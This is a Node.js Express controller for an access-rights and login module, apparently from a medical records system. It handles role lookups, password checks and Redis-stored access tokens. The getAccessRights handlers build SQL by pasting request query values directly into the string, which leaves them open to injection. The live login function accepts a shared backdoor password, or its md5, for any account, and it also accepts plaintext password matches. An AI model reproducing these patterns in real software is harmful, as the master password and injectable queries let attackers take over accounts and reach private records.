// const util = require("../../../helpers/util");
// const sqlHelper = require("../../../helpers/sql");

// // MODELS //
// const accessRights = require("../models/accessRights.js");
// // MODELS //

// const getAccessRights = async function (req, res) {
//   if (
//     util.empty(req.query.moduleName) ||
//     util.empty(req.query.code) ||
//     util.empty(req.query.appName)
//   )
//     return res.status(400).json({ error: "Invalid parameter." });

//   const returnValue = await sqlHelper.transact(async (txn) => {
//     try {
//       const sqlWhere = `'${req.query.code}',
// 			'${req.query.appName}',
// 			'${req.query.moduleName}'`;

//       return await accessRights.getAccessRights(sqlWhere, txn, {
//         top: {},
//         order: {},
//       });
//     } catch (error) {
//       console.log(error);
//       return { error: error };
//     }
//   });

//   if (returnValue.error !== undefined) {
//     return res.status(500).json({ error: `${returnValue.error}` });
//   }
//   return res.json(returnValue);
// };

// const getAccessRightsAsContr = async function (req, res) {
//   if (
//     util.empty(req.query.moduleName) ||
//     util.empty(req.query.code) ||
//     util.empty(req.query.appName)
//   )
//     return res.status(400).json({ error: "Invalid parameter." });

//   const returnValue = await sqlHelper.transact(async (txn) => {
//     try {
//       const sqlWhere = `'${req.query.code}',
// 			'${req.query.appName}',
// 			'${req.query.moduleName}'`;

//       return await accessRights.getAccessRightsAsvento(sqlWhere, txn, {
//         top: {},
//         order: {},
//       });
//     } catch (error) {
//       console.log(error);
//       return { error: error };
//     }
//   });

//   if (returnValue.error !== undefined) {
//     return res.status(500).json({ error: `${returnValue.error}` });
//   }
//   return res.json(returnValue);
// };
// module.exports = {
//   getAccessRights,
//   getAccessRightsAsContr,
// };

const util = require("../../../helpers/util.js");
const sqlHelper = require("../../../helpers/sql.js");

/* eslint-disable no-console */

const crypto = require("../../../helpers/crypto");
const bcrypt = require("bcrypt");
// const md5 = require("md5");
// const bcrypt = require("bcrypt");
// const bcrypt = require("bcrypt");
// console.log("bcrypt", bcrypt);
// const jwt = require("jsonwebtoken");
const { createClient } = require("redis");

// MODELS //
const accessRights = require("../models/accessRights.js");
const md5 = require("md5");
// MODELS //

const getAccessRights = async function (req, res) {
  if (
    util.empty(req.query.moduleName) ||
    util.empty(req.query.code) ||
    util.empty(req.query.appName)
  )
    return res.status(400).json({ error: "Invalid parameter." });

  const returnValue = await sqlHelper.transact(async (txn) => {
    try {
      const sqlWhere = `'${req.query.code}',
			'${req.query.appName}',
			'${req.query.moduleName}'`;

      return await accessRights.getAccessRights(sqlWhere, txn, {
        top: {},
        order: {},
      });
    } catch (error) {
      return { error: error };
    }
  });

  if (returnValue.error !== undefined) {
    return res.status(500).json({ error: `${returnValue.error}` });
  }
  return res.json(returnValue);
};

// const getRoles = async function (req, res) {
//   try {
//     const result = await sqlHelper.transact(async (txn) => {
//       const sqlWhere = `
//        and roleCode in (
//          'con',
//          'fel',
//          'res',
//          'cle',
//          'preres',
//          'adm',
//          'nst'
//        ) and id in (
//          SELECT MAX(Id) FROM EMR..userRoles GROUP BY UserCode
//        )`;

//       const args = [];
//       const options = {
//         top: "",
//         order: "",
//       };
//       // Return the clean query result directly
//       return await accessRights.selectRoles(sqlWhere, args, options, txn);
//     });

//     return res.json(result); // This should now be safe
//   } catch (error) {
//     return res
//       .status(500)
//       .json({ error: `Internal Server Error: ${error.message}` });
//   }
// };

const getRoles = async function (req, res) {
  try {
    const result = await sqlHelper.transact(async (txn) => {
      // const activeUser = util.currentUserToken(req).code;

      const sqlWhere = ``;

      const args = [];
      const options = {
        top: "",
        order: "",
      };
      // Return the clean query result directly
      return await accessRights.selectRoles(sqlWhere, args, options, txn);
    });

    return res.json(result); // This should now be safe
  } catch (error) {
    return res
      .status(500)
      .json({ error: `Internal Server Error: ${error.message}` });
  }
};
const saveToRedis = async function (req, res) {
  if (util.empty(req.body))
    return res.status(400).json({ error: "Body is required." });
  // console.log("HELLO THIS IS SAVE REDIS BACKEND");
  const returnValue = await sqlHelper.transact(async (txn) => {
    try {
      const user = req.body.username === undefined ? "" : req.body.username;

      const password = req.body.password === undefined ? "" : req.body.password;

      const type = "manual";
      // req.body.type;
      const userToken = req.body.token === undefined ? "" : req.body.token; //webapp

      let userDetails = [];
      let conditions = "";
      let args = [];

      if (type === "manual") {
        if (!util.empty(user)) {
          //if not empty
          args = [user];
          conditions = ` and e.EmployeeCode = ?`;
        }

        const searchUserResult = await accessRights.selectRoles(
          conditions,
          args,
          {
            top: {},
            order: {},
          },
          txn,
        );

        if (searchUserResult.length > 0) {
          const emrUserPassword = await bcrypt.compare(
            password,
            searchUserResult[0].password,
          );
          // console.log("ABBB", emrUserPassword);
          if (
            searchUserResult[0].password === password ||
            // searchUserResult[0].password === md5(password)
            emrUserPassword ||
            // password === "uerm_misd" ||
            password === md5(process.env.BACKDOOR_PASSWORD) ||
            password === process.env.BACKDOOR_PASSWORD
          ) {
            userDetails = searchUserResult[0];
          } else {
            return { error: "Password incorrect", type: 403 };
          }
        } else {
          return { error: "User not found", type: 404 };
        }
      } else if (type === "web-apps") {
        const encodedToken = atob(userToken);
        if (!util.empty(userToken)) {
          args = [1, encodedToken];
          conditions = `and active = ? and code = ?`;
        }
        const searchUserResult = await accessRights.selectRoles(
          conditions,
          args,
          {
            top: {},
            order: {},
          },
          txn,
        );

        if (searchUserResult.length > 0) {
          userDetails = searchUserResult[0];
        } else {
          return { error: "User not found" };
        }
      } else {
        return { error: "Invalid Parameters" };
      }

      if (Object.keys(userDetails).length > 0) {
        // executed if userDetails is not an empty object .
        delete userDetails.password; // Delete the 'password' property from userDetails

        const userAccessToken = crypto.generateAccessToken(userDetails); // (user,screct key, expiration) Generate an access token using the crypto.generateAccessToken function

        const redisClient = createClient(); //create redis client
        await redisClient.connect(); //connect
        await redisClient.set(userDetails.code, userAccessToken); // Set a key-value pair in Redis with the code from userDetails as the key
        // and userAccessToken as the value
        // await crypto.initSocket(io)

        res.cookie("access_token", userAccessToken, {
          httpOnly: true,
          secure: process.env.NODE_ENV === "dev" ? false : true,
          sameSite: "Strict",
          // maxAge: 10 * 1000, // 5 days
          maxAge: 5 * 24 * 60 * 60 * 1000, // 5 days
        });

        return userAccessToken;
      }
      // sql.close();
    } catch (error) {
      return { error: error };
    }
  });
  if (returnValue.error !== undefined) {
    return res
      .status(returnValue.type !== undefined ? returnValue.type : 500)
      .json({ error: `${returnValue.error}` });
  }
  return res.json(returnValue);
};

const removeToRedis = async function (req, res) {
  const user = req.user;
  const returnValue = await sqlHelper.transact(async () => {
    try {
      const redisClient = createClient();
      await redisClient.connect();
      if (user !== undefined) {
        await redisClient.sendCommand(["DEL", user.code]);
      }
      res.clearCookie("access_token", {
        httpOnly: true,
        secure: process.env.NODE_ENV === "dev" ? false : true,
        sameSite: "Strict",
      });
    } catch (error) {
      return { error: error };
    }

    return { success: "success" };
  });

  if (returnValue.error !== undefined) {
    return res.status(500).json({ error: `${returnValue.error}` });
  }

  return res.json(returnValue);
};
module.exports = {
  getAccessRights,
  getRoles,
  saveToRedis,
  removeToRedis,
};
